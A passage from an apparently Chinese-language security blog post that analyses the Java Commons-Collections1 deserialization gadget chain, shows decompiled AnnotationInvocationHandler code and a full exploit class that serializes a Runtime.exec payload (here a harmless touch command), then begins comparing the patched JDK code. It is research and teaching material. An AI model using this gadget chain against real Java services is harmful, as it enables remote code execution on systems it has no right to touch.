</span></span></code></pre></div><p>这时调用 <code>chainedTransformer.transform</code>, 等价于 <code>java.lang.Runtime.getRuntime().exec(new String[]{"/bin/touch", "/dev/shm/rmb122_pwned"})</code>,<br>将 chainedTransformer 作为 <code>Lazymap</code> 的 <code>factory</code>, 再 get 一个不存在的 key, 就能达到 RCE 的目的.</p><p>问题就是现在缺少一个在 readObject 时 get 的对象, 而且最好是 jre 内置的. 这里就可以看到作者的牛逼之处, 毕竟这些类可不是随便找找就能找到的.</p><p>这里看 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 这个类的 <code>invoke</code> 方法,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#6272a4>// class AnnotationInvocationHandler implements InvocationHandler, Serializable {
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>AnnotationInvocationHandler<span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>&lt;?</span> <span style=color:#8be9fd;font-style:italic>extends</span> Annotation<span style=color:#ff79c6>&gt;</span> paramClass<span style=color:#ff79c6>,</span> Map<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>&gt;</span> paramMap<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    Class<span style=color:#ff79c6>[]</span> arrayOfClass <span style=color:#ff79c6>=</span> paramClass<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getInterfaces</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span>paramClass<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isAnnotation</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>||</span> arrayOfClass<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span> <span style=color:#ff79c6>!=</span> 1 <span style=color:#ff79c6>||</span> arrayOfClass<span style=color:#ff79c6>[</span><span style=color:#ff79c6>false</span><span style=color:#ff79c6>]</span> <span style=color:#ff79c6>!=</span> Annotation<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> AnnotationFormatError<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;Attempt to create proxy for a non-annotation type.&#34;</span><span style=color:#ff79c6>);</span> 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>type</span> <span style=color:#ff79c6>=</span> paramClass<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>memberValues</span> <span style=color:#ff79c6>=</span> paramMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>Object paramObject<span style=color:#ff79c6>,</span> Method paramMethod<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[]</span> paramArrayOfObject<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    String str <span style=color:#ff79c6>=</span> paramMethod<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    Class<span style=color:#ff79c6>[]</span> arrayOfClass <span style=color:#ff79c6>=</span> paramMethod<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getParameterTypes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>str<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;equals&#34;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;&amp;</span> arrayOfClass<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span> <span style=color:#ff79c6>==</span> 1 <span style=color:#ff79c6>&amp;&amp;</span> arrayOfClass<span style=color:#ff79c6>[</span><span style=color:#ff79c6>false</span><span style=color:#ff79c6>]</span> <span style=color:#ff79c6>==</span> Object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> equalsImpl<span style=color:#ff79c6>(</span>paramArrayOfObject<span style=color:#ff79c6>[</span>0<span style=color:#ff79c6>]);</span> 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>arrayOfClass<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span> <span style=color:#ff79c6>!=</span> 0<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> AssertionError<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;Too many parameters for an annotation method&#34;</span><span style=color:#ff79c6>);</span> 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>switch</span> <span style=color:#ff79c6>(</span>str<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;toString&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> toStringImpl<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;hashCode&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> Integer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>valueOf</span><span style=color:#ff79c6>(</span>hashCodeImpl<span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>case</span> <span style=color:#f1fa8c>&#34;annotationType&#34;</span><span style=color:#ff79c6>:</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>type</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Object object <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>memberValues</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>str<span style=color:#ff79c6>);</span> <span style=color:#6272a4>// &lt;--- 这里调用了 get, 而且 memberValues 也是 Map 类型, 可以把 LazyMap 放在这里
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>object <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> IncompleteAnnotationException<span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>type</span><span style=color:#ff79c6>,</span> str<span style=color:#ff79c6>);</span> 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>object <span style=color:#ff79c6>instanceof</span> ExceptionProxy<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>((</span>ExceptionProxy<span style=color:#ff79c6>)</span>object<span style=color:#ff79c6>).</span><span style=color:#50fa7b>generateException</span><span style=color:#ff79c6>();</span> 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>isArray</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>&amp;&amp;</span> Array<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getLength</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>!=</span> 0<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        object <span style=color:#ff79c6>=</span> cloneArray<span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>);</span> 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> object<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>再来看这个类的 <code>readObject</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>readObject</span><span style=color:#ff79c6>(</span>ObjectInputStream paramObjectInputStream<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> IOException<span style=color:#ff79c6>,</span> ClassNotFoundException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    paramObjectInputStream<span style=color:#ff79c6>.</span><span style=color:#50fa7b>defaultReadObject</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    AnnotationType annotationType <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        annotationType <span style=color:#ff79c6>=</span> AnnotationType<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getInstance</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>type</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>IllegalArgumentException illegalArgumentException<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> InvalidObjectException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;Non-annotation type in annotation serial stream&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Map map <span style=color:#ff79c6>=</span> annotationType<span style=color:#ff79c6>.</span><span style=color:#50fa7b>memberTypes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span>Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>Entry</span> entry <span style=color:#ff79c6>:</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>memberValues</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>entrySet</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        String str <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>)</span>entry<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getKey</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        Class clazz <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>)</span>map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>str<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            Object object <span style=color:#ff79c6>=</span> entry<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getValue</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span>clazz<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isInstance</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!(</span>object <span style=color:#ff79c6>instanceof</span> ExceptionProxy<span style=color:#ff79c6>))</span>
</span></span><span style=display:flex><span>                entry<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setValue</span><span style=color:#ff79c6>((</span><span style=color:#ff79c6>new</span> AnnotationTypeMismatchExceptionProxy<span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;[&#34;</span> <span style=color:#ff79c6>+</span> object <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;]&#34;</span><span style=color:#ff79c6>)).</span><span style=color:#50fa7b>setMember</span><span style=color:#ff79c6>((</span>Method<span style=color:#ff79c6>)</span>annotationType<span style=color:#ff79c6>.</span><span style=color:#50fa7b>members</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>str<span style=color:#ff79c6>)));</span> 
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span> 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> 
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>关键点在 <code>this.memberValues.entrySet()</code>, 那么问题来了, 这里又跟 invoke 有什么关系呢.<br>这里涉及到 java 的动态代理机制, 这里不再赘述, 可以理解为调用这个方法实际上调用的是代理的 invoke, 在上面可以看到 AnnotationInvocationHandler 本身继承了 InvocationHandler 且重写了 invoke 方法. 刚好可以拿来利用, 接下来问题就很简单了, exp 如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.Transformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ChainedTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ConstantTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.InvokerTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Constructor<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.InvocationHandler<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Proxy<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.HashMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.Map<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>CommonsCollections1</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span>java<span style=color:#ff79c6>.</span><span style=color:#50fa7b>lang</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>Runtime</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;getMethod&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Class<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;getRuntime&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;invoke&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>null</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;exec&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;/bin/touch&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;/dev/shm/rmb122_pwned_1&#34;</span><span style=color:#ff79c6>}}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ChainedTransformer<span style=color:#ff79c6>(</span>transformers<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Constructor constructor <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;org.apache.commons.collections.map.LazyMap&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getDeclaredConstructor</span><span style=color:#ff79c6>(</span>Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Transformer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        HashMap hashMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;();</span>
</span></span><span style=display:flex><span>        Object lazyMap <span style=color:#ff79c6>=</span> constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span>hashMap<span style=color:#ff79c6>,</span> chainedTransformer<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        constructor <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getDeclaredConstructor</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 因为构造方法不是 public, 只能通过反射构造出来
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        InvocationHandler invo <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>InvocationHandler<span style=color:#ff79c6>)</span> constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span>Deprecated<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> lazyMap<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Object proxy <span style=color:#ff79c6>=</span> Proxy<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newProxyInstance</span><span style=color:#ff79c6>(</span>invo<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getClassLoader</span><span style=color:#ff79c6>(),</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> invo<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        constructor <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getDeclaredConstructor</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Object obj <span style=color:#ff79c6>=</span> constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span>Deprecated<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> proxy<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>obj<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>接下来问题是 java 是如何修复的呢? 一开始不知道已经修复, 复现出来导致还以为自己写错了 233
看到</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>boolean</span> <span style=color:#50fa7b>isApplicableJavaVersion</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> JavaVersion<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isAnnInvHUniversalMethodImpl</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>才发现有可能是 java 内部类动过的原因.</p><p>拿最新版的 <code>readObject</code> 与上面 u66 版本的对比一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>readObject</span><span style=color:#ff79c6>(</span>ObjectInputStream s<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> IOException<span style=color:#ff79c6>,</span> ClassNotFoundException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    GetField fields <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span><span style=color:#50fa7b>readFields</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    Class<span style=color:#ff79c6>&lt;?</span> <span style=color:#8be9fd;font-style:italic>extends</span> Annotation<span style=color:#ff79c6>&gt;</span> t <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>)</span>fields<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;type&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>(</span>Object<span style=color:#ff79c6>)</span><span style=color:#ff79c6>null</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    Map<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>&gt;</span> streamVals <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Map<span style=color:#ff79c6>)</span>fields<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;memberValues&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>(</span>Object<span style=color:#ff79c6>)</span><span style=color:#ff79c6>null</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    AnnotationType annotationType <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        annotationType <span style=color:#ff79c6>=</span> AnnotationType<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getInstance</span><span style=color:#ff79c6>(</span>t<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>IllegalArgumentException var13<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> InvalidObjectException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;Non-annotation type in annotation serial stream&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Map<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> Class<span style=color:#ff79c6>&lt;?&gt;&gt;</span> memberTypes <span style=color:#ff79c6>=</span> annotationType<span style=color:#ff79c6>.</span><span style=color:#50fa7b>memberTypes</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    Map<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>&gt;</span> mv <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> LinkedHashMap<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    String name<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    Object value<span style=color:#ff79c6>;</span>
